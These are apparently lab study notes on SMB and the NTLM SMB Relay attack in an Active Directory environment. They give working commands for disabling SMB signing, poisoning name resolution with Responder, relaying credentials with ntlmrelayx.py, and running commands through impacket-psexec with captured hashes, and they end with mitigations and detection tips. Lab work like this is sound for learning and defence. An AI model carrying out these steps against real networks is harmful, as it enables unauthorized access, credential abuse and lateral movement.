# SMB Relay Attack

Notes on SMB fundamentals, protocol configuration, and the SMB Relay attack in an Active Directory lab environment.

---

## 1. SMB Overview

**SMB (Server Message Block)** is a network file-sharing protocol used for:

- File and directory access
- Printer sharing
- Inter-process communication
- Remote document editing
- Printer status alerts (e.g., "out of paper")

> It primarily operates over **TCP port 445** and is widely used in Windows environments.

### Key Characteristics

- Works in a **client-server model**
- Supports authentication via **NTLM** or **Kerberos**
- Name resolution order typically includes:
  - **DNS** (primary resolution)
  - **LLMNR / NBT-NS** (fallback mechanisms, used in smaller networks)

### Typical SMB Communication Flow

1. Connection established (TCP 445) / NetBIOS session established
2. Protocol negotiation (SMB dialect)
3. Authentication (NTLM / Kerberos)
4. Session setup
5. Access to shared resources
6. File operations (read/write/edit)

---

## 2. SMB Protocol Versions

### SMBv1

- Legacy protocol
- Vulnerable to multiple attacks (e.g., relay, EternalBlue)
- Should be **disabled in modern environments**

### SMBv2 / SMBv3

- Improved performance and security
- Supports:
  - Message signing
  - Encryption (SMBv3)

---

## 3. Configuring SMB in Windows

### Enable SMBv1 (Not Recommended)

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
```

**Verify SMBv1:**
```powershell
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
```

### Enable SMBv2 / SMBv3

```powershell
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
```

**Verify SMBv2:**
```powershell
Get-SmbServerConfiguration | Select-Object EnableSMB2Protocol
```

### Disable SMBv1 (Recommended)

Disable the legacy, vulnerable protocol on production/hardened systems (inverse of the enable command above using `-EnableSMB1Protocol $false`).

---

## 4. SMB Signing Configuration

SMB signing cryptographically verifies each SMB message, preventing tampering and relay.

### Disable SMB Signing (Vulnerable State)

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
```

### Enable SMB Signing (Secure State)

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

### Verify Configuration

```powershell
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
```

---

## 5. What Is an SMB Relay Attack

An **SMB Relay Attack** exploits the **NTLM challenge-response authentication mechanism**.

Instead of cracking credentials, the attacker:

- Intercepts authentication requests
- Relays them to another system
- Authenticates as the victim user

### Key Weakness

NTLM does **not validate the server identity**, allowing authentication to be forwarded to unintended systems.

---

## 6. Attack Preconditions

- SMB signing is **disabled or not enforced**
- NTLM authentication is enabled
- Network allows lateral communication
- Victim initiates authentication (or is coerced)

---

## 7. Attack Workflow

1. Attacker poisons name resolution (LLMNR/NBT-NS)
2. Victim attempts to access a fake resource
3. Authentication request is captured
4. Authentication is relayed to a target system
5. Target system grants access if credentials are valid

---

## 8. Identifying Vulnerable Systems

Use Nmap to detect SMB signing status:

```bash
nmap -p445 --script smb2-security-mode.nse <target>
```

Full example with additional flags:

```bash
nmap -v -sT -sV -A -O -p 445 192.168.2.100 --script smb2-security-mode.nse
```

**Example Output:**
```
Message signing enabled but not required
```

This indicates the system is **vulnerable to SMB relay**.

---

## 9. Attack Execution

### Step 1: Configure and Run Responder

Edit configuration:

```bash
vim Responder.conf
```

- **Disable:**
  - SMB = Off
  - HTTP = Off
- **Enable:**
  - LLMNR, NBT-NS, mDNS

Start Responder:

```bash
python Responder.py -I eth0 -dvw
```

### Step 2: Launch ntlmrelayx.py

Create target list:

```bash
echo 192.168.1.51 > targets.txt
```

Run relay:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

### Step 3: Trigger Authentication

From the victim, get them to access a UNC path pointing at the attacker:

```
\\fakehost
```

or:

```
\\attacker-ip
```

---

## 10. Command Execution

Use Impacket tools for post-exploitation:

```bash
impacket-psexec user@target -hashes <LM>:<NTLM>
```

### Important

- Requires **local administrator privileges**
- Without admin rights:
  - Limited access (shares, sessions)
  - No command execution

---

## 11. Impact

- Unauthorized access to systems
- Remote command execution
- Privilege escalation
- Lateral movement across domain
- No password cracking required

---

## 12. Mitigation Strategies

### Enforce SMB Signing

- Prevents relay attacks by ensuring message integrity

### Restrict NTLM Usage

- Prefer **Kerberos authentication**
- Disable NTLM where possible

### Network Segmentation

- Limit lateral movement between systems

### Use Strong Access Controls

- Minimize local administrator privileges
- Apply least privilege principles

### Monitor and Detect

**Tools:**
- Wireshark
- Zeek
- Suricata

**Look for:**
- Unusual authentication flows
- Multiple SMB sessions from a single host
- LLMNR/NBT-NS spoofing activity

---

## Quick Reference — Command Summary

| Purpose | Command |
|---|---|
| Enable SMBv1 | `Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol` |
| Enable SMBv2/v3 | `Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force` |
| Disable SMB signing | `Set-SmbServerConfiguration -RequireSecuritySignature $false -Force` |
| Enable SMB signing | `Set-SmbServerConfiguration -RequireSecuritySignature $true -Force` |
| Check signing status | `Get-SmbServerConfiguration \| Select-Object RequireSecuritySignature` |
| Scan for SMB signing | `nmap -p445 --script smb2-security-mode.nse <target>` |
| Start Responder | `python Responder.py -I eth0 -dvw` |
| Run ntlmrelayx | `ntlmrelayx.py -tf targets.txt -smb2support -i` |
| Execute via relayed hash | `impacket-psexec user@target -hashes <LM>:<NTLM>` |

---

*Notes compiled from an internal Offensive Active Directory lab reference (SMB Relay Attack).*
